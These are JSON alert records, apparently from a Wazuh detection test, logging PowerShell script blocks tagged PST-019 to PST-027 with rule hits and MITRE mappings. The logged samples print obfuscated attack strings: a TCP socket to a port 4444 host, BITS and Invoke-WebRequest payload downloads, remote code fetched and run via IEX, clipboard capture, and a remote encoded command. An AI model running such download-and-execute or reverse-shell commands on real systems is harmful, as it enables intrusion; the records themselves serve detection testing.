{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"3dfc415a-003c-4904-85a0-ba6b915502f1","scriptBlockText":"$sampleId='PST-019'; $b = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721493","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-019'; $b = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 3dfc415a-003c-4904-85a0-ba6b915502f1\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:37.4787806Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:37.4787806Z\",\"eventRecordID\":\"721493\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-019'; $b = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 3dfc415a-003c-4904-85a0-ba6b915502f1\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-019'; $b = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"3dfc415a-003c-4904-85a0-ba6b915502f1\"}}}","id":"1784280937.385261","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":3,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:35:37.710+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"31139fba-d1d2-4128-9b37-55661bc8753f","scriptBlockText":"$sampleId='PST-020'; $parts=@('$CMD=(''','Inv''+''o','Ke-ExP','R`ESSi','on''); &amp;',' (get','-COmm`AND $C','Md) \\\"Wr','iTe-oU','`tPut ''Th`eSIs','-iner','T''\\\"'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721508","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-020'; $parts=@('$CMD=(''','Inv''+''o','Ke-ExP','R`ESSi','on''); &',' (get','-COmm`AND $C','Md) \"Wr','iTe-oU','`tPut ''Th`eSIs','-iner','T''\"'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 31139fba-d1d2-4128-9b37-55661bc8753f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:37.8051762Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:37.8051762Z\",\"eventRecordID\":\"721508\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-020'; $parts=@('$CMD=(''','Inv''+''o','Ke-ExP','R`ESSi','on''); &',' (get','-COmm`AND $C','Md) \\\"Wr','iTe-oU','`tPut ''Th`eSIs','-iner','T''\\\"'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 31139fba-d1d2-4128-9b37-55661bc8753f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-020'; $parts=@('$CMD=(''','Inv''+''o','Ke-ExP','R`ESSi','on''); &amp;',' (get','-COmm`AND $C','Md) \\\\\\\"Wr','iTe-oU','`tPut ''Th`eSIs','-iner','T''\\\\\\\"'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"31139fba-d1d2-4128-9b37-55661bc8753f\"}}}","id":"1784280938.385261","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:38.659+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"a14fded2-e11e-4daf-aa4a-00c86bcf26f6","scriptBlockText":"$sampleId='PST-021'; $p = ('C:' + '\\\\ProgramData' + '\\\\Reports' + '\\\\inventory.json'); Write-Output $p; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721522","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-021'; $p = ('C:' + '\\ProgramData' + '\\Reports' + '\\inventory.json'); Write-Output $p; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: a14fded2-e11e-4daf-aa4a-00c86bcf26f6\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:38.1483462Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:38.1483462Z\",\"eventRecordID\":\"721522\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-021'; $p = ('C:' + '\\\\ProgramData' + '\\\\Reports' + '\\\\inventory.json'); Write-Output $p; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: a14fded2-e11e-4daf-aa4a-00c86bcf26f6\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-021'; $p = ('C:' + '\\\\\\\\ProgramData' + '\\\\\\\\Reports' + '\\\\\\\\inventory.json'); Write-Output $p; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"a14fded2-e11e-4daf-aa4a-00c86bcf26f6\"}}}","id":"1784280938.385261","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:38.856+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"229e971e-1600-4e59-8417-b328179f4a97","scriptBlockText":"$sampleId='PST-022'; $indicator='Get-Clipboa`rd -Raw | ConvertTo-Json -Comp`ress'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721525","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-022'; $indicator='Get-Clipboa`rd -Raw | ConvertTo-Json -Comp`ress'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 229e971e-1600-4e59-8417-b328179f4a97\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:38.4884920Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:38.4884920Z\",\"eventRecordID\":\"721525\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-022'; $indicator='Get-Clipboa`rd -Raw | ConvertTo-Json -Comp`ress'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 229e971e-1600-4e59-8417-b328179f4a97\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-022'; $indicator='Get-Clipboa`rd -Raw | ConvertTo-Json -Comp`ress'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"229e971e-1600-4e59-8417-b328179f4a97\"}}}","id":"1784280938.385261","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:38.900+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"848c7b5e-53eb-4d43-a616-89ee84ec3766","scriptBlockText":"$sampleId='PST-023'; $indicator='$client=New-Object System.Net.Sockets.TcpClient(''203.0.113.77'',4444); $stream=$client.GetStream(); $buffer=New-Object byte[] 4096; $read=$stream.Read($buffer,0,$buffer.Length)'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721551","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-023'; $indicator='$client=New-Object System.Net.Sockets.TcpClient(''203.0.113.77'',4444); $stream=$client.GetStream(); $buffer=New-Object byte[] 4096; $read=$stream.Read($buffer,0,$buffer.Length)'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 848c7b5e-53eb-4d43-a616-89ee84ec3766\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:40.1121031Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:40.1121031Z\",\"eventRecordID\":\"721551\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-023'; $indicator='$client=New-Object System.Net.Sockets.TcpClient(''203.0.113.77'',4444); $stream=$client.GetStream(); $buffer=New-Object byte[] 4096; $read=$stream.Read($buffer,0,$buffer.Length)'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 848c7b5e-53eb-4d43-a616-89ee84ec3766\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-023'; $indicator='$client=New-Object System.Net.Sockets.TcpClient(''203.0.113.77'',4444); $stream=$client.GetStream(); $buffer=New-Object byte[] 4096; $read=$stream.Read($buffer,0,$buffer.Length)'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"848c7b5e-53eb-4d43-a616-89ee84ec3766\"}}}","id":"1784280940.385261","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:40.789+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d7e2011a-2c71-4944-940b-21cfb54c0ca8","scriptBlockText":"$sampleId='PST-024'; $indicator='Invoke-Command -ComputerName ''host.example.invalid'' -ScriptBlock { powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA }'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721555","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-024'; $indicator='Invoke-Command -ComputerName ''host.example.invalid'' -ScriptBlock { powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA }'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d7e2011a-2c71-4944-940b-21cfb54c0ca8\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:40.4372079Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:40.4372079Z\",\"eventRecordID\":\"721555\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-024'; $indicator='Invoke-Command -ComputerName ''host.example.invalid'' -ScriptBlock { powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA }'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d7e2011a-2c71-4944-940b-21cfb54c0ca8\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-024'; $indicator='Invoke-Command -ComputerName ''host.example.invalid'' -ScriptBlock { powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA }'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d7e2011a-2c71-4944-940b-21cfb54c0ca8\"}}}","id":"1784280940.385261","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script used \"Invoke-command\" cmdlet to execute code on remote computer","firedtimes":1,"groups":["windows"," powershell"],"id":"91823","level":14,"mail":true,"mitre":{"id":["T1059.001","T1021.006"],"tactic":["Execution","Lateral Movement"],"technique":["PowerShell","Windows Remote Management"]}},"timestamp":"2026-07-17T11:35:40.799+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"27618776-c7b5-45e7-b9bd-c9e8db38cb52","scriptBlockText":"$sampleId='PST-025'; $parts=@('sTArt-BI`ts','t`raN','SFER -s','OUrcE ''hTt','pS://BITS','.eXaMpLe.','iNV`aL','Id/paYl`OaD','.bIn'' -d','ESTInAtIOn ''','$Env:TEmp\\\\C','aChe.b','iN'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721559","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-025'; $parts=@('sTArt-BI`ts','t`raN','SFER -s','OUrcE ''hTt','pS://BITS','.eXaMpLe.','iNV`aL','Id/paYl`OaD','.bIn'' -d','ESTInAtIOn ''','$Env:TEmp\\C','aChe.b','iN'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 27618776-c7b5-45e7-b9bd-c9e8db38cb52\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:40.7597082Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:40.7597082Z\",\"eventRecordID\":\"721559\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-025'; $parts=@('sTArt-BI`ts','t`raN','SFER -s','OUrcE ''hTt','pS://BITS','.eXaMpLe.','iNV`aL','Id/paYl`OaD','.bIn'' -d','ESTInAtIOn ''','$Env:TEmp\\\\C','aChe.b','iN'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 27618776-c7b5-45e7-b9bd-c9e8db38cb52\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-025'; $parts=@('sTArt-BI`ts','t`raN','SFER -s','OUrcE ''hTt','pS://BITS','.eXaMpLe.','iNV`aL','Id/paYl`OaD','.bIn'' -d','ESTInAtIOn ''','$Env:TEmp\\\\\\\\C','aChe.b','iN'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"27618776-c7b5-45e7-b9bd-c9e8db38cb52\"}}}","id":"1784280940.390617","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":3,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:35:40.808+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"2677efa9-c6a5-4fab-a7bb-687e13244cde","scriptBlockText":"$sampleId='PST-026'; $indicator='In`voke-WebR`equest -Uri ''https://files.exa`mple.inva`lid/up`date.bin'' -OutFile ''$env:TEMP\\\\upda`te.bin'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721561","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-026'; $indicator='In`voke-WebR`equest -Uri ''https://files.exa`mple.inva`lid/up`date.bin'' -OutFile ''$env:TEMP\\upda`te.bin'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 2677efa9-c6a5-4fab-a7bb-687e13244cde\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:41.0934889Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:41.0934889Z\",\"eventRecordID\":\"721561\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-026'; $indicator='In`voke-WebR`equest -Uri ''https://files.exa`mple.inva`lid/up`date.bin'' -OutFile ''$env:TEMP\\\\upda`te.bin'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 2677efa9-c6a5-4fab-a7bb-687e13244cde\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-026'; $indicator='In`voke-WebR`equest -Uri ''https://files.exa`mple.inva`lid/up`date.bin'' -OutFile ''$env:TEMP\\\\\\\\upda`te.bin'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"2677efa9-c6a5-4fab-a7bb-687e13244cde\"}}}","id":"1784280941.390617","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":4,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:35:41.940+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d5a3778d-7dc5-44cf-8b17-d1f8d77a1aab","scriptBlockText":"$sampleId='PST-027'; $indicator='$x=New-Object -ComObject MsXml2.ServerXmlHttp; $x.Open(''GET'',''https://xml.example.invalid/task'',$false); $x.Send(); IEX $x.ResponseText'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721575","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-027'; $indicator='$x=New-Object -ComObject MsXml2.ServerXmlHttp; $x.Open(''GET'',''https://xml.example.invalid/task'',$false); $x.Send(); IEX $x.ResponseText'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d5a3778d-7dc5-44cf-8b17-d1f8d77a1aab\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:41.6374961Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:41.6374961Z\",\"eventRecordID\":\"721575\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-027'; $indicator='$x=New-Object -ComObject MsXml2.ServerXmlHttp; $x.Open(''GET'',''https://xml.example.invalid/task'',$false); $x.Send(); IEX $x.ResponseText'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d5a3778d-7dc5-44cf-8b17-d1f8d77a1aab\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-027'; $indicator='$x=New-Object -ComObject MsXml2.ServerXmlHttp; $x.Open(''GET'',''https://xml.example.invalid/task'',$false); $x.Send(); IEX $x.ResponseText'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d5a3778d-7dc5-44cf-8b17-d1f8d77a1aab\"}}}","id":"1784280942.395939","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","firedtimes":1,"groups":["windows"," powershell"],"id":"91837","level":4,"mail":false,"mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]}},"timestamp":"2026-07-17T11:35:42.074+0200"}
